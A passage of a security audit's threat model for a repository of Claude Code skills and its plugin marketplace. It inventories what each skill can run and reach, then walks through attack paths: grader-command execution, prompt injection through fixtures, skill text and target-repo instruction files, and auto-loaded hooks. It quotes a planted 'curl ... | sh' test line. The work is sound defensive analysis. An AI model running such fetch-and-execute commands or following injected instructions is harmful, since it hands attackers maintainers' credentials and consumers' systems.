# Threat model

Phases 1 and 2 of an audit of `konstruktoid/agent-instructions-skills`. Every claim below cites a
path and line in this repository. Where a field could not be determined from the repository, it
reads `UNKNOWN` rather than a guess.

**Status, 2026-08-23, control 6 updated 2026-08-30.** Nine controls from
[controls.md](controls.md) have since landed and are committed: controls 1 through 9. Control 6 is
complete on the remote as well, with `v0.1.0` pushed and the tag ruleset applied. The passages they
change carry a **Landed** note stating the current behavior, and the finding each note answers is
kept in the past tense rather than deleted, because the finding is what the note is evidence
against. Every citation in this document points at the current file, so a line number inside a
landed passage names the fix, not the code it replaced.

The repository is both a library of Claude Code skills and its own plugin marketplace. Two facts
from Phase 1 shape everything in Phase 2, so they are stated first:

- Every plugin entry sets `"source": "./"` (`.claude-plugin/marketplace.json:11`, `:21`, `:31`,
  `:40`), so the plugin root and the repository root are the same directory.
- As audited, no plugin entry declared a `version`, and `README.md` stated that every commit
  counted as a new version and an update always fetched the current default branch. Control 6
  gives all four entries the same `version` and documents a tag-based release, so the second fact
  now holds only for a consumer who installs without a ref.

## Contents

- Phase 1: capability inventory
- Phase 2: attack paths

## Phase 1: capability inventory

### Components that do not exist

Enumerated so their absence is a recorded finding rather than an omission. `git ls-files` returns
no match for any of the following, and the repository root holds none of them:

| Component | Evidence |
|---|---|
| Session hooks (`hooks/hooks.json`) | Not tracked; not present at the repository root |
| MCP server definitions (`.mcp.json`) | Not tracked; not present at the repository root |
| Slash commands (`commands/`) | Not tracked; not present at the repository root |
| Installable subagents (`agents/`) | Not present, and `scripts/check_skills.py:543` fails the build if it appears |
| Committed `.claude/settings.json` | Not tracked. `README.md:184` tells a *consumer* to commit one, in the consumer's repository |

As audited, `scripts/check_skills.py` blocked exactly one of the four auto-discovered plugin
directories and left the other three unguarded. That gap was attack path 1.3.

**Landed.** `check_plugin_root` at `scripts/check_skills.py:543` now fails on any repository-root
entry that is not on the allowlist at `:104`, skipping only the local-only names at `:127` that
`.gitignore` already excludes. All four auto-discovered names fail, and so does a name a future
release of Claude Code begins discovering, because the check names what is allowed rather than what
is forbidden.

### Skills

As audited, all eight skills carried frontmatter with `name` and `description` only. None
declared a tools field, an allowed-tools field, or any permission scope: `check_skill` at
`scripts/check_skills.py:460` validated `name`, `description`, the verify-loop wording and the body
length, and never read a capability field. `check_tools` at `scripts/check_skills.py:390` existed
but was called only from `check_agent_template` (`scripts/check_skills.py:531`). So for every row
below, the tools column states what the body implies.

**Landed.** Control 9 gives every skill a `capabilities` block declaring `tools`, `shell`, `paths`
and `egress`, whose shape `check_capabilities` at `scripts/check_skills.py:418` enforces. The rows
below are the evidence those blocks were written from, and `scripts/check_capabilities.py` reports
what a later change adds without declaring it. The block is a declaration, not a sandbox: nothing
enforces it at runtime, and a skill body remains free to do what it likes.

All eight read `${CLAUDE_PLUGIN_ROOT}/instructions/` under a plugin install, which is outside the
skill directory and inside the plugin root: `skills/ansible/ansible-verification-loop/SKILL.md:255`,
`skills/bash/bash-secure-scripting/SKILL.md:329`, `skills/bash/bash-testing/SKILL.md:196`,
`skills/github/github-actions-security/SKILL.md:344`,
`skills/github/github-organization-governance/SKILL.md:282`,
`skills/github/github-repository-security/SKILL.md:290`,
`skills/python/python-secure-coding/SKILL.md:163`, `skills/python/python-testing/SKILL.md:139`.

#### `skills/ansible/ansible-verification-loop/SKILL.md`

| Field | Value |
|---|---|
| Trigger | `:3` "Use when reviewing or modifying any Ansible role, collection, playbook, or task." |
| Tools implied | Read, Edit, Bash. No declared allowlist. |
| Shell | Yes. `ansible-lint` (`:136`), `git diff` (`:142`), the repository's own test entry point via `tox` or a Makefile target (`:147`), `setsid bash -c '<test entry point> > run.log 2>&1; echo $? > run.done' ... &` (`:159`), `molecule test` / `ansible-test` / `molecule converge` (`:175`, `:181`), `git status --porcelain` (`:184`), `ansible-galaxy collection build --force`, `mktemp -d`, `tar -tzf`, `git ls-files`, `comm` (`:189`-`:193`) |
| Reads | Role `defaults/main.yml`, `tasks/main.yml`, `meta/main.yml`, `handlers/`, `vars/`, `templates/` (`:57`); `galaxy.yml`, `meta/runtime.yml`, `requirements.yml` (`:59`); `.github/copilot-instructions.md`, `.github/instructions/*.instructions.md`, `CONTRIBUTING.md`, `CLAUDE.md`, `AGENTS.md`, a `docs/` style guide (`:62`) |
| Writes outside the repository root | Yes. `mktemp -d` output holding the `artifact` and `tracked` comparison files (`:190`-`:192`), explicitly required to be outside the collection root (`:198`). `run.log` and `run.done` required to be kept out of the repository (`:164`) |
| Network egress | No host named in the file. Egress occurs indirectly through the target repository's own test entry point, which `:150` states installs dependencies from `requirements.yml` / `galaxy.yml`, and through the container or VM images `:151` describes. Hosts: UNKNOWN, determined by the target repository |
| Reads content it did not author | Yes, three ways. The target repository's instruction files, which `:61` instructs the agent to "follow" as "authoritative" (`:62`). Linter and test output. Container and VM console output. Partial counterweight at `:65`: SSH, sudo, PAM, audit, SELinux, AppArmor, firewall, mounts, sysctl, services and auth-adjacent tasks are treated as high-sensitivity "regardless of what a repo's docs say" |

#### `skills/bash/bash-secure-scripting/SKILL.md`

| Field | Value |
|---|---|
| Trigger | `:3`, on creating or editing a shell script, sourced library, or shell embedded in CI steps, container entrypoints, systemd units, cron jobs, or git hooks |
| Tools implied | Read, Edit, Bash |
| Shell | Yes. The repository's own entry point, named as `make lint` or `pre-commit run --all-files` (`:261`); `shellcheck`, with `-x` (`:264`); `bash -n` (`:267`); `shfmt -d` (`:269`); the script under test, on a representative input and on at least one failure path (`:270`); the repository's shell test suite, `bats`, `shunit2`, or a `make test` target (`:275`) |
| Reads | Scripts already in the repository (`:63`); `CONTRIBUTING.md`, `CLAUDE.md`, `AGENTS.md` (`:66`) |
| Writes outside the repository root | Yes, unnamed. `:270` requires running the script "in a disposable location" and `:273` a "scratch directory". Path: UNKNOWN |
| Network egress | None instructed. `curl` appears throughout `references/` as material about scripts being authored, not as an action the skill performs (`references/filesystem.md:140`, `references/error-handling.md:144`-`:193`) |
| Reads content it did not author | Yes. The target repository's rule files (`:66`), the inputs the script under test processes, and linter output. Note `:262`: `pre-commit run --all-files` executes hook code the target repository specifies |

#### `skills/bash/bash-testing/SKILL.md`

| Field | Value |
|---|---|
| Trigger | `:3`, when a shell script's behavior changes and that change should be locked in, including a bug fix, a pinned exit code or output, or coverage of validation, cleanup, privilege, or a destructive path |
| Tools implied | Read, Edit, Bash |
| Shell | Yes. The repository's entry point, `make test`, the CI step, or `bats test/` (`:146`); the script directly against a scratch directory including one failure path (`:148`); `shellcheck` and `bash -n` (`:153`) |
| Reads | `test/`, `tests/`, `spec/`, `*.bats`, `*_test.sh`, `test_*.sh`, a `Makefile` or `justfile` test target, and the test step in `.github/workflows/*.yml` (`:51`); two or three existing tests near the code being changed (`:56`) |
| Writes outside the repository root | Yes, unnamed: the scratch directory at `:148`. Path: UNKNOWN |
| Network egress | None instructed |
| Reads content it did not author | Yes. Existing tests, `Makefile`/`justfile` contents, and the target repository's CI workflow files (`:51`) |

#### `skills/python/python-secure-coding/SKILL.md`

| Field | Value |
|---|---|
| Trigger | `:3`, on writing or editing Python, especially input handling, subprocess and OS calls, query construction, templating, cryptography, secrets, or access control |
| Tools implied | Read, Edit, Bash |
| Shell | Yes. `uv run ruff check .`, `uv run ruff format --check .`, `uv run ty check` (`:114`-`:116`); the repository's dependency vulnerability scanner when dependencies changed (`:117`) |
| Reads | `instructions/python_coding_instructions.md` (`:46`, `:60`), resolved under `${CLAUDE_PLUGIN_ROOT}` at `:163` |
| Writes outside the repository root | None instructed |
| Network egress | Not named in the skill. `uv run` resolves from a package index; host UNKNOWN, set by the target repository's configuration. `python-secure-coding/references/supply-chain.md:25` names `uv audit`, `pip-audit` and Snyk as scanners to run only where already configured |
| Reads content it did not author | Yes. Dependency metadata, scanner output, and the source under review |

#### `skills/python/python-testing/SKILL.md`

| Field | Value |
|---|---|
| Trigger | `:3`, when a Python change adds behavior, fixes a bug, changes a public interface, or touches security-relevant logic |
| Tools implied | Read, Edit, Bash |
| Shell | Yes. The repository's own entry point, a `tox` env, a Makefile target, or the command in `.github/workflows/*.yml`, through the package manager where one exists, for example `uv run pytest` (`:95`); the full suite (`:97`); coverage tooling only where already configured (`:99`) |
| Reads | `pyproject.toml`, `pytest.ini`, `setup.cfg`, `tox.ini` (`:50`); two or three existing tests near the code being changed (`:52`) |
| Writes outside the repository root | None instructed |
| Network egress | None instructed |
| Reads content it did not author | Yes. Existing tests, project configuration, and the target repository's CI workflow files (`:98`) |

#### `skills/github/github-actions-security/SKILL.md`

The highest-egress skill in the repository.

| Field | Value |
|---|---|
| Trigger | `:3`, on anything under `.github/workflows/`, an `action.yml` or `action.yaml`, or a `dependabot.yml` covering actions |
| Tools implied | Read, Edit, Bash. Implied credentials: a GitHub token, since `:253` instructs setting `GH_TOKEN`; Docker daemon access (`:239`); push access to the repository (`:261`) |
| Shell | Yes. `docker run --rm -v "$PWD:/repo" -w /repo rhysd/actionlint@sha256:b1934ee5...` (`:239`-`:241`, pinned by tag as audited, by digest since); `uvx "zizmor@1.29.0" --persona=pedantic .` (`:249`); `gh api repos/actions/checkout/releases/latest`, `gh api repos/actions/checkout/commits/v7.0.1`, `gh api repos/OWNER/REPO/tags` (`:149`, `:150`, `:154`); `gh workflow run` and a push to a branch (`:261`); optionally `pinact` or `ratchet`, which edit files in place and are gated on asking first (`:161`-`:165`) |
| Reads | Workflows already in the repository, `.github/dependabot.yml`, `.github/CODEOWNERS`, `zizmor.yml`, `.actionlint.yaml` (`:66`); `CONTRIBUTING.md`, `CLAUDE.md`, `AGENTS.md` (`:68`) |
| Writes outside the repository root | None instructed. Note `:239` bind-mounts the whole working directory read-write into a container |
| Network egress | Yes, four destinations. `api.github.com` through every `gh api` call (`:149`, `:150`, `:154`) and through `gh workflow run` (`:261`); the GitHub remote, through the branch push at `:261`; a Python package index, through `uvx` resolving `zizmor` at run time (`:249`); a container registry, through `docker run` pulling the actionlint image (`:239`) |
| Reads content it did not author | Yes, and this is the skill's most exposed surface. Third-party action repositories' tags, releases and release notes (`:149`-`:159`), where `:153` instructs confirming "against the repository's own release notes" and `:158` instructs reading release notes for breaking changes. Also `zizmor` and `actionlint` output, and workflow run logs (`:261`) |

#### `skills/github/github-repository-security/SKILL.md`

| Field | Value |
|---|---|
| Trigger | `:3`, on creating or hardening a repository, rulesets, branch protection, visibility, collaborator access, scanning, `SECURITY.md`, `CODEOWNERS`, environments, deploy keys, or release and tag protection |
| Tools implied | Read, Edit, Bash. Implied credentials: a GitHub token with **administrative** rights on the target repository. `:121`-`:134` read `security_and_analysis`, rulesets, direct collaborators, deploy keys, Actions permissions and environments; `references/rulesets.md:52` writes a ruleset with `gh api --method POST`. This is the widest permission any skill in the repository implies |
| Shell | Yes. The `gh api` and `gh ruleset list` block at `:121`-`:134`; `gh api repos/OWNER/REPO --jq .security_and_analysis` and `gh api repos/OWNER/REPO/rulesets/RULESET_ID` (`:193`, `:194`); `gh ruleset check --default --repo OWNER/REPO` (`:201`); OpenSSF Scorecard, resolved to its current release and pinned by digest in automated use (`:202`-`:206`); a credential scanner over history (`:208`); `actionlint` and `zizmor` for any workflow touched (`:211`); `gh api --method POST repos/OWNER/REPO/rulesets --input ruleset.json` (`references/rulesets.md:52`) |
| Reads | `CONTRIBUTING.md`, `SECURITY.md`, `CLAUDE.md`, `AGENTS.md` (`:71`); a `ruleset.json` committed to the tree (`:155`); the repository's full commit history during a secret scan (`:208`) |
| Writes outside the repository root | None instructed |
| Network egress | Yes. `api.github.com` for every `gh` call above. A container registry for the Scorecard image (`:205`). `:141` instructs checking "the current REST documentation" where a call fails, which implies a fetch of `docs.github.com`; the mechanism is not named, so the tool used is UNKNOWN |
| Reads content it did not author | Yes. The target repository's own documentation (`:71`), every API response including ruleset descriptions and collaborator metadata (`:121`-`:134`), and, through `references/agent-content.md`, third-party skills, hooks, commands and MCP definitions submitted for review |

#### `skills/github/github-organization-governance/SKILL.md`

| Field | Value |
|---|---|
| Trigger | `:3`, on setting organization or enterprise policy, ruleset rollout, custom properties, access review, actions and runner policy, or compliance evidence |
| Tools implied | Read, Edit, Bash. Implied credentials: an organization owner or enterprise admin token, plus audit log read. `:182` reads `orgs/ORG/repos` and `orgs/ORG/properties/values`; `references/identity-and-access.md:33` reads the `2fa_disabled` member filter; `:108` reads outside collaborators; `references/audit-and-compliance.md:36` reads `orgs/ORG/audit-log` |
| Shell | Yes. `comm -23` over two process substitutions wrapping `gh api --paginate` (`:181`-`:186`), plus the reads in the reference files above |
| Reads | Organization settings, rulesets, the custom property schema, actions and runner policy, app installations, token policy, and members outside the requirements (`:62`); enterprise-level controls (`:68`) |
| Writes outside the repository root | None instructed |
| Network egress | Yes. `api.github.com` for every `gh api` call |
| Reads content it did not author | Yes. Member logins, repository names, custom property values, audit log entries, and evaluate-mode violation reports (`:188`) |

### Reference files

Thirty files under `skills/*/*/references/`, loaded on demand through each skill's triage
table. They carry the commands cited above. They are held to the same prose and Contents-list
checks as a `SKILL.md` (`scripts/check_skills.py:164`, `:677`) and to no capability check at all.

### Agent templates

Five files, and the only content in the repository that declares a tool allowlist. `README.md:80`
states they are templates, not installable agents.

| Path | Trigger | Tools declared | Shell | Egress |
|---|---|---|---|---|
| `agent-templates/ansible-reviewer.md` | `:3` | `Read, Grep, Glob, Edit, Bash` (`:12`) | Yes, through Bash, for `ansible-lint` and the target repository's test entry point (`:9`) | None. `:11` names `WebFetch` as an addition to make deliberately |
| `agent-templates/python-security-reviewer.md` | `:3` | `Read, Grep, Glob, Edit, Bash` (`:12`) | Yes, through Bash, for `ruff` and `ty` (`:9`) | None. `:10` names `WebFetch` as an addition to make deliberately |
| `agent-templates/prose-editor.md` | `:3` | `Read, Edit` (`:12`) | No. `:11` states that adding Bash means accepting that it executes commands | None |
| `agent-templates/workflow-security-reviewer.md` | `:3` | `Read, Grep, Glob, Edit, Bash` (`:13`) | Yes, through Bash, for `actionlint` and `zizmor` (`:9`) | Yes, and the only template that states egress of its own, though not by hostname. `:9`-`:10` names `actionlint`, `zizmor`, and the `gh` call that resolves an action SHA; `:62`-`:64` states what each reaches, the container run that mounts the tree, the package index `zizmor` resolves from, and the GitHub API, and requires the summary to say when a check ran without `GH_TOKEN` |
| `agent-templates/bash-security-reviewer.md` | `:3` | `Read, Grep, Glob, Edit, Bash` (`:13`) | Yes, and wider than the others: `shellcheck`, `bash -n`, the repository's formatter, and the script under review itself (`:9`-`:12`), bounded at `:53`-`:57` to a disposable location with a report-instead-of-run rule for a destructive script | No host named in the file. Egress occurs indirectly through the script under review, which `:53` has this agent run: hosts UNKNOWN, determined by that script |

All five set `model: inherit`, enforced at `scripts/check_skills.py:524`. The tools field is
enforced non-empty at `scripts/check_skills.py:390`.

The tools column above states what the `tools:` line declares, which is the whole tool surface
only while no template carries a `memory:` field. Claude Code grants a subagent with persistent
memory the Read, Write and Edit tools so that it can maintain its own memory files, whatever
`tools:` holds, so the field would widen every row here without changing the line the row cites,
and under `project` scope it would add a committed directory of model-authored text that each
later session loads as system prompt. No template sets it and
`scripts/check_skills.py:533` fails one that does, which is what keeps this column complete.

### Instructions documents

Six files under `instructions/`. `README.md:211` states no tool auto-discovers them. They carry
no shell invocation of their own and no egress. Under the submodule install at `README.md:218`
they are referenced directly from a consumer's `CLAUDE.md` (`README.md:224`-`:226`), which loads
them into every session rather than on demand.

### Marketplace manifest

`.claude-plugin/marketplace.json` declares four plugins covering all eight skills. Every entry
sets `"source": "./"` and `"strict": false`, and none declares a `version`. What `strict: false`
relaxes is UNKNOWN: the repository does not state it and no file in the repository defines it.

### Repository automation

| Path | Trigger | Permissions | Shell | Paths | Egress | Untrusted input |
|---|---|---|---|---|---|---|
| `.github/workflows/lint.yml` | `push` to `main` and `pull_request` (`:4`-`:8`). Not `pull_request_target` | `permissions: {}` at the top level (`:10`), `contents: read` per job (`:22`, `:68`, `:91`, `:117`, `:153`). `persist-credentials: false` on every checkout (`:27`, `:73`, `:96`, `:122`, `:158`) | Yes. `uv run --frozen python scripts/check_skills.py` (`:47`); `python3 scripts/check_citations.py` (`:52`); `uv run --frozen ruff check`, `ruff format --check`, `ty check` (`:80`-`:84`); `python3 scripts/check_evals.py` (`:110`); `docker run` of `rhysd/actionlint` pinned by digest (`:135`-`:136`); `uvx "zizmor@1.29.0"` over `.github/` (`:146`) | The checkout only | Yes. `astral-sh/setup-uv` fetches uv; `uvx` resolves zizmor from a package index at run time (`:146`); `docker run` pulls the actionlint image (`:135`). Actions are pinned by SHA (`:25`, `:33`, `:165`) | The pull request head, at `contents: read` with no secrets beyond `github.token` (`:145`) |
| `scripts/check_skills.py` | CI, `lint.yml:47` | Read-only | None | `skills/`, `agent-templates/`, `instructions/`, `.claude-plugin/marketplace.json` (`:835`, `:79`, `:81`, `:70`) | None | The files under check |
| `scripts/check_evals.py` | CI, `lint.yml:110`, in the `evals` job added by control 3. As audited it ran nowhere but by hand (`README.md:428`) | Read-only | None | `evals/` | None | Eval suite files |
| `scripts/check_citations.py` | CI, `lint.yml:52`, in the `skills` job | Read-only | `git ls-files`, to resolve an abbreviated citation path against the tracked files | The documents that cite and the files they cite | None | The files under check |

### `evals/run_eval.py`

`evals/run_eval.py`, 1573 lines, is the highest-privilege artifact in the repository. It does not
ship to consumers; it runs on the maintainer's machine.

| Field | Value |
|---|---|
| Trigger | Manual. `evals/README.md:73` gives `python3 evals/run_eval.py tasks --skill ... --model sonnet --parallel 5` |
| Shell | Two kinds. `subprocess.run(..., shell=False)` for the `claude` subprocess (`:418`) and for git (`:818`, `:819`, `:956`, `:964`, `:1140`, `:1156`, `:1157`, `:1241`). And `subprocess.run(command, shell=True, ...)` at `:745`-`:747`, where `command` is a grader string read from a suite's `assertions.json` |
| Permissions requested of the agent under test | As audited: `--permission-mode bypassPermissions` whenever `--tools` was not passed, which was every task run. Since control 5: `bypassPermissions` plus the `TASK_TOOLS` allowlist at `:98`, applied through `RunPermissions` at `:246` and `:292`-`:297`, with the unbounded surface behind `--all-tools` (`:1010`, `:1707`). `--setting-sources project` keeps the caller's own settings out of both arms (`:281`) |
| Filesystem, outside the repository root | Yes, and it reaches a live credential. `:222` resolves `$CLAUDE_CONFIG_DIR/.credentials.json`, or `~/.claude/.credentials.json`, and `:225` symlinks it into the run's private home. A private HOME tree is created per run (`:209`-`:221`). `evals/.gitignore` records the consequence: "it contains a symlink to the credentials file that authenticates the run ... none of it may be pushed" |
| Environment | `env = dict(os.environ)` (`:237`), so the run starts from the caller's full environment; `$EVAL_TOOL_BIN` is prepended to `PATH` (`:240`) |
| Network egress | The Anthropic API, through `claude`. Plus whatever the graded agent chooses to do, which as audited was unconstrained, and is now what Bash can reach: `WebFetch` is off the `TASK_TOOLS` allowlist (`:98`). Plus whatever a fixture's own tooling fetches (`evals/README.md:59`-`:71` provisions `ansible-lint`, `zizmor`, `ansible-core`, `shellcheck`, `bats`) |
| Reads content it did not author | Comprehensively. Task prompts from `tasks.json`, fixture trees, grader commands from `assertions.json`, and the model's own transcript, which is then parsed at `:550`-`:576` |

Supporting eval data:

- `evals/*/assertions.json`, six files, hold the strings executed at `run_eval.py:732`. Since
  control 4, a run refuses when this file differs from the review baseline (`run_eval.py:662`).
- `evals/*/fixtures/**` are deliberately flawed inputs, excluded from `ruff` and `ty`
  (`pyproject.toml:28`, `:32`) and from secret scanning (`.github/secret_scanning.yml:12`).
- `evals/probe-sandbox/` is a mixed repository holding a Dockerfile, a `docker-compose.yml`, a
  Jenkinsfile, a `.gitlab-ci.yml`, Terraform, Kubernetes manifests, an Ansible role, Go, Python
  and `scripts/backup.sh` (`evals/probe-sandbox/README.md:3`-`:9`).

### Repository governance, as it stands

| Item | State |
|---|---|
| `.github/CODEOWNERS` | `* @konstruktoid` (`:1`). One account owns everything, including itself |
| `SECURITY.md` | Absent as audited. Control 8 adds it at the root, naming private vulnerability reporting, which `gh api .../private-vulnerability-reporting` confirms is enabled |
| Data-access statement | Absent as audited. Control 8 puts it in the same `SECURITY.md`, which is where `references/scanning-and-response.md:110` asks for it |
| Tags | None. `git tag` returns nothing. Control 6 documents and enforces a tag-based release, but no tag is pushed |
| Releases | None, and no release workflow |
| `.gitignore` | Blocks `**/.credentials.json` and `.env` tree-wide (`:9`, `:10`) |
| `.github/dependabot.yml` | Weekly, with a 7-day cooldown on both ecosystems and 14 days on a uv major (`:25`, `:42`) |

## Phase 2: attack paths

Ordered as the brief requires. Every path names its entry point, the file it abuses, what the
agent ends up doing, and the blast radius on a consumer's machine.

### Actor 1: an outside contributor who opens a PR or issue

#### 1.1 Grader command execution on the maintainer's machine

**Entry point.** A pull request that adds or edits `evals/<skill>/assertions.json`, or adds a
fixture with a `workspace_command` assertion. Both are the ordinary shape of a contribution to
this repository, since a new eval task requires both files.

**File abused.** `evals/run_eval.py:745`-`:747`. The grader string is passed to
`subprocess.run(command, shell=True, ...)`. The comment at `:743` gives the reason, and the reason
holds only for the trust assumption it names: "The command comes from a checked-in
assertions.json in this repository". A pull request branch is not yet that.

**What happens.** The maintainer runs the suite as `evals/README.md:73` documents. `run_grader`
executes the string under `/bin/sh` with `cwd` set to the finished workspace and `env` from
`run_environment(home)`, which is `dict(os.environ)` plus the run's private HOME
(`run_eval.py:237`, `:728`).

**Blast radius.** Arbitrary code as the maintainer, on the maintainer's machine, in a process
whose HOME holds a symlink to the live `~/.claude/.credentials.json` (`run_eval.py:222`-`:238`).
From there the attacker has the credential that authenticates the maintainer's Claude Code, and
write access to the working tree of a repository whose default branch reaches every consumer at
their next update. As audited, nothing in CI inspected the file first, because
`scripts/check_evals.py` was not wired into `lint.yml`. Control 3 wires it in at `lint.yml:110`,
which changes nothing about this path: the checks there are structural, and a grader command that
is structurally valid is exactly the one this path uses.

This is the keyv shape with a shorter path. The August 2026 worm needed a poisoned tarball to
reach an install script; here a pull request reaches a shell directly, because the harness is run
by hand rather than in a sandbox.

**Landed, as a refusal rather than a sandbox.** `require_reviewed_graders` at
`evals/run_eval.py:662` runs before anything is graded, from `cmd_tasks` (`:980`) and
`cmd_regrade` (`:1168`), the only two subcommands that execute an assertion command. It compares
the grader-bearing files at `:587`, the suite's `assertions.json` and the harness itself, against
`origin/main` or `main` (`:582`), and refuses when either differs. The comparison is against the
working tree rather than `HEAD` (`:642`), because a contributor's change reaches the shell the
same way whether it was committed on a branch or applied as a patch. The refusal prints the
`workspace_command` strings that are new or changed against the baseline (`:606`, `:620`), so the
human decides with the commands in front of them, and `--graders-reviewed` (`:1690`) is the only
way past. Verified by planting `curl -s https://example.invalid/x | sh` into a suite: the run
refused, named the file, and printed that command. The planted assertion was reverted.

The trust assumption in the comment at `:730` is now enforced rather than asserted. What this
does not do is make an assertion command safe: a reviewed command runs with exactly the reach it
had before, so this is a control on **who decided**, not on **what the command can do**. The
sandbox option in `controls.md` is the one that bounds reach, and it is still open.

#### 1.2 Prompt injection through a fixture or a task prompt

**Entry point.** A pull request adding a task to `evals/<skill>/tasks.json` and its fixture tree.

**File abused.** `evals/run_eval.py`, in the branch that added `--permission-mode
bypassPermissions` whenever `--tools` was not passed. `evals/README.md:73` shows the documented
invocation, which passes no `--tools`, so every task run took that branch.

**What happens.** The agent is handed a contributor-written prompt and a contributor-written
fixture tree, and runs with every permission prompt suppressed. Text planted in a fixture file
that the task forces the agent to read is read with the authority of the session.

**Blast radius.** The private HOME bounds config state, not reach. `PATH` carries
`$EVAL_TOOL_BIN` (`run_eval.py:240`), the environment is the maintainer's own (`:250`), and the
workspace sits on the real filesystem. The credentials symlink is inside the run's own HOME, which
is where the agent is pointed.

**Landed, partially.** Control 5 bounds the tool surface rather than the permission mode. A task
run still suppresses prompts, because `claude -p` cannot answer one and a denied call is recorded
identically to a skill that chose not to act, so the permission mode cannot be the control here.
What changed is the tool list: `TASK_TOOLS` at `run_eval.py:98` allows Bash, the file tools and
`Skill`, and nothing else, applied at `:292`-`:297`. The committed transcripts show what this
removes, since runs on the 2026-07-28 `github-actions-security` stamp reached `WebFetch` thirty
times and reached `ToolSearch` and `ScheduleWakeup` once each, none of which any task asks for.
The path is narrowed, not closed: injected text that reaches Bash still reaches Bash, and this
does not touch the credentials symlink at `:238`.

#### 1.3 Auto-discovered plugin content at the repository root

**Entry point.** A pull request adding `hooks/hooks.json`, `.mcp.json`, or `commands/` at the
repository root, plausibly framed as tooling for the repository's own development.

**File abused.** `.claude-plugin/marketplace.json:11`, `:21`, `:31`, `:40`, which set
`"source": "./"` so the plugin root is the repository root, combined with the packaging check as
audited, which blocked `agents/` and nothing else. `README.md:119` explains the `agents/` rule
exactly, and stops there.

**What happens.** On the next `/plugin update`, the consumer's Claude Code discovers the new
directory or file at the plugin root and loads it.

**Blast radius.** A hook runs shell on every consumer's machine with the consumer's permissions
and without the consumer asking, which is the precise definition
`references/agent-content.md:35` gives. An MCP definition adds a tool surface backed by a host the
project does not control (`references/agent-content.md:118`). This is the keyv precedent's
`.claude/settings.json` persistence move, reached through a normal pull request rather than
through a compromised publish. The only control standing in the way was one human reading the diff.

**Landed.** `check_plugin_root` at `scripts/check_skills.py:543` fails on any repository-root entry
outside the allowlist at `:104`. A pull request adding `hooks/`, `commands/`, `.mcp.json` or
`agents/` now fails the check that `.github/workflows/lint.yml:47` runs on every pull request.
Verified by planting `hooks/` and `.mcp.json` at the root: both were reported, and the run exited
non-zero. The path is closed for auto-discovered content at the root, and untouched for anything
written as prose inside `skills/`, which is attack path 1.4.

#### 1.4 Injection into a skill or reference body

**Entry point.** A pull request editing any `skills/**/SKILL.md` or `skills/**/references/*.md`.

**File abused.** Any of the thirty-eight. `scripts/check_skills.py` checks the name matches the
directory (`check_skills.py:484`), the description shape (`:486`), the capability block's shape
(`:487`), the
verify-loop wording (`:488`), the body length (`:490`), cross-references (`:646`), prose markers
(`:695`) and Contents lists (`:737`).
None of that reads intent, and the repository says so in its own words at
`references/agent-content.md:42`: "there is no automated defense at all and they read as
documentation".

**What happens.** A reference file is the better hiding place: it is loaded on demand rather than
at session start, it runs to 250 lines, and it is where the commands already live. The four
review patterns the repository publishes for other people's content, reach, egress, priority
language, and framing that lowers scrutiny (`references/agent-content.md:86`-`:96`), are applied
to consumers' repositories and to nothing in this one's CI.

**Blast radius.** Every consumer's agent, at the next update, at whatever privilege the abused
skill implies. For `github-repository-security` that is a token with repository admin.

#### 1.5 Issue bodies

Closed on the current tree. No skill reads an issue body, and `lint.yml:4`-`:9` triggers on
`push` and `pull_request` only, with no `issues` or `issue_comment` trigger and no workflow that
consumes event text. Recorded so a future workflow addition is understood as opening it.

### Actor 2: compromised maintainer credentials, pushing to main and cutting a release

#### 2.1 There is no release to forge, because the branch is the release

The attacker does not need to cut anything. No tag exists, no plugin entry declares a `version`,
and `README.md:153`-`:154` states plainly that without the `@<tag>` suffix "the marketplace tracks the
default branch, and every commit pushed here reaches the project at its next update, reviewed by
nobody on the consuming side". Pushing to `main` **is** publishing.

This inverts the keyv precedent's lesson rather than repeating it. There, provenance was valid
because the compromise was upstream of the build, and the attestation truthfully described a
poisoned artifact. Here there is no build and no artifact to attest at all: the git ref is the
distribution channel.

#### 2.2 Review offers no resistance

`.github/CODEOWNERS:1` is `* @konstruktoid`. A single account owns every path, including
`CODEOWNERS` itself, so the self-owning rule `references/agent-content.md:59` requires of every
other repository cannot be satisfied here for lack of a second team. An attacker holding those
credentials satisfies every review requirement the repository can express.

This is where the arrayref precedent applies, at the review step rather than the publish step. A
GitHub-verified commit means the signing key is registered to the account, not that the human
authored it. A spoofed author on a verified commit merged by the compromised account passes every
mechanism present.

#### 2.3 What the attacker plants, ranked by yield

1. **A hook or MCP definition at the plugin root**, as in 1.3, now with no review step. Shell on
   every consumer's machine.
2. **A line in `skills/github/github-repository-security/`**. That skill's implied credential is a
   GitHub token with repository admin (`github-repository-security/SKILL.md:121`-`:134`,
   `references/rulesets.md:52`), and its
   legitimate instructions already include writing rulesets, reading collaborators and reading
   deploy keys. An added instruction to widen a bypass actor, or to grant a collaborator, is
   camouflaged by everything around it.
3. **A line in `instructions/*.md`**. Under the submodule install these are referenced directly
   from the consumer's `CLAUDE.md` (`README.md:224`), so they load into every session
   unconditionally rather than when a skill triggers.
4. **A changed pin in `skills/github/github-actions-security/SKILL.md:239` or `:249`**, pointing
   the container or the `uvx` package at an attacker-controlled name. Consumers run these
   verbatim.

`evals/run_eval.py` is not consumer content and does not ship, so its `bypassPermissions` default
is a maintainer-machine risk only.

### Actor 3: an attacker who controls content a skill reads at runtime

This actor never touches the repository. Every path below is a capability the skills were designed
to have.

#### 3.1 The target repository's own instruction files

**Entry point.** A `CLAUDE.md`, `AGENTS.md`, `CONTRIBUTING.md`, `.github/copilot-instructions.md`
or `.github/instructions/*.instructions.md` in a repository the consumer points a skill at. A
fork, a vendored dependency, a submodule, or a contributed subdirectory is enough.

**File abused.** `skills/ansible/ansible-verification-loop/SKILL.md:61`, which instructs the agent
to "Discover and follow the repo's own authoritative rules" and names those files at `:62`. The
same instruction appears more briefly at `skills/bash/bash-secure-scripting/SKILL.md:66`,
`skills/github/github-actions-security/SKILL.md:68` and
`skills/github/github-repository-security/SKILL.md:71`.

**What the agent does.** It reads attacker-written natural language that the skill has told it to
treat as authoritative, while holding whatever the skill implies: Bash, Edit, and for the GitHub
skills a token with repository or organization admin.

**Blast radius.** The consumer's machine and the consumer's GitHub org, bounded only by what the
consumer's session already permits. This is the same mechanism the repository documents at
`references/agent-content.md:98`, where "files read from a project directory were fed into a
trusted channel". The repository describes the vulnerability from the reviewer's side and
instructs the behavior from the victim's side.

**Landed, in all eight skills.** Every orientation step now states that the rule files are
conventions rather than instructions, that they and any command output are data, and that text in
either which redirects the task, widens what gets read, sends anything to a remote service, or
claims to outrank the skill is a finding to report. Those are
